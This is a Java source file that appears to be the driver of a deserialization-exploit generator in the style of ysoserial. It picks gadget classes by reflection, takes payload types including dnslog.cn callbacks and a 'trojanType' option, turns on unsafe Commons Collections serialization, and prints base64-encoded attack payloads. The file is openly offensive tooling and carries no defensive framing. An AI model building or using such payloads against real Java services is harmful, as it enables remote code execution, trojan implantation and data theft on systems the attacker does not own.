package core;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import core.enumtypes.GadgetType;
import core.enumtypes.PayloadType;
import org.apache.commons.cli.*;


public class GeneratePayload {


    public static Object generatePayload(String gadGetType, String payloadType, String trojanType) throws ClassNotFoundException,
            NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Object payload = null;
        PayloadType payloadType1 = null;
        boolean flag = false;

//        for (GadgetType gt : GadgetType.values()) {
//            if (gadGetType.toLowerCase().equals(String.valueOf(gt))) {
//                flag = true;
//                break;
//            }
//        }
//        if (!flag) {
//            System.out.println("Not support gadGetType: " + gadGetType);
//            return payload;
//        }


        for (PayloadType pt : PayloadType.values()) {
            if (payloadType.toLowerCase().equals(String.valueOf(pt))) {
                payloadType1 = pt;
                break;
            }
        }
        if (!payloadType.contains("dnslog.cn")  && payloadType1 == null) {
            System.out.println("Not support payloadType: " + payloadType);
            return payload;
        }

        Class clazz = null;
        try {
            String classPath = String.format("core.gadgets.%s", new Object[]{gadGetType});
            clazz = Class.forName(classPath);
        }catch (ClassNotFoundException e){
            String classPath = String.format("core.payloads.%s", new Object[]{gadGetType});
            clazz = Class.forName(classPath);
        }

        Method method = clazz.getMethod("getObject", PayloadType.class, String.class);
        payload = (Object) method.invoke(clazz, payloadType1, trojanType);
        return payload;
    }

    public static byte[] generatePayloadByte(String gadGetType, String payloadType, String trojanType) throws ClassNotFoundException,
            NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        byte[] payload = null;
        PayloadType payloadType1 = null;
        boolean flag = false;

//        for (GadgetType gt : GadgetType.values()) {
//            if (gadGetType.toLowerCase().equals(String.valueOf(gt))) {
//                flag = true;
//                break;
//            }
//        }
//        if (!flag) {
//            System.out.println("Not support gadGetType: " + gadGetType);
//            return payload;
//        }

        for (PayloadType pt : PayloadType.values()) {
            if (payloadType.toLowerCase().equals(String.valueOf(pt))) {
                payloadType1 = pt;
                break;
            }
        }
        if (!payloadType.contains("dnslog.cn")  && payloadType1 == null) {
            System.out.println("Not support payloadType: " + payloadType);
            return payload;
        }

        Class clazz = null;
        try {
            String classPath = String.format("core.gadgets.%s", new Object[]{gadGetType});
            clazz = Class.forName(classPath);
        }catch (ClassNotFoundException e){
            String classPath = String.format("core.payloads.%s", new Object[]{gadGetType});
            clazz = Class.forName(classPath);
        }
        Method method = clazz.getMethod("getByte", PayloadType.class, String.class);
        payload = (byte[]) method.invoke(clazz, payloadType1, trojanType);
        return payload;
    }

    public static void main(String[] args) throws ParseException {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        CommandLineParser parser = new BasicParser();
        Options options = new Options();
        options.addOption("g", "gadGetType", true, "");
        options.addOption("p", "payloadType", true, "");
        options.addOption("t", "trojanType", true, "");

        CommandLine commandLine = parser.parse(options, args);
        String gadGetType = commandLine.getOptionValue("g");
        String payloadType = commandLine.getOptionValue("p");
        String trojanType = commandLine.getOptionValue("t");
        try {
            byte[] payload = generatePayloadByte(gadGetType, payloadType, trojanType);
            if (payload.length >1){
                System.out.print(utils.Util.base64Encode(payload));
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
